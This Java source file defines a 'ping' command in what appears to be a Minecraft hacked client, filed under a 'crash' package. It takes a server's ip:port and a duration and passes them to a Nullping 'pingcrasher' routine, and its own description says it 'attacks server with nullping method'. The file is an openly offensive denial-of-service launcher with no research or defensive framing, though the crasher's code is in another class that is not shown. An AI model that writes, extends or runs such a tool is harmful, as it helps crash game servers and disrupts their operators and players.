package neko.itskekoffcode.hclient.commands.impl.crash;

import neko.itskekoffcode.clientapi.utils.Nullping;
import neko.itskekoffcode.hclient.commands.Command;

import java.util.regex.Pattern;

public class PingCommand extends Command {
    @Override
    public void execute(String[] args) throws Exception {
        if (args.length == 1) {
            Pattern regex = Pattern.compile("\\b(?:(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(?:25[0-5)]|2[0-4]\\d|[01]?\\d\\d?):\\d{1,5}\\b");
            if (args[0].matches(regex.pattern())) {
                Nullping.pingcrasher(args[0], 120);
            }
        }
        if (args.length == 2) {
            Pattern regex = Pattern.compile("\\b(?:(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(?:25[0-5)]|2[0-4]\\d|[01]?\\d\\d?):\\d{1,5}\\b");
            if (args[0].matches(regex.pattern())) {
                Nullping.pingcrasher(args[0], Integer.parseInt(args[1]));
            }
        }
        if (args.length < 1) {
            PingCommand.msg("Wrong usage! Check help for help", true);
        }
    }

    @Override
    public String getName() {
        return "ping";
    }

    @Override
    public String getDescription() {
        return "attacks server with nullping method";
    }

    @Override
    public String getUsage() {
        return "ping <ip:port> <time>";
    }
}
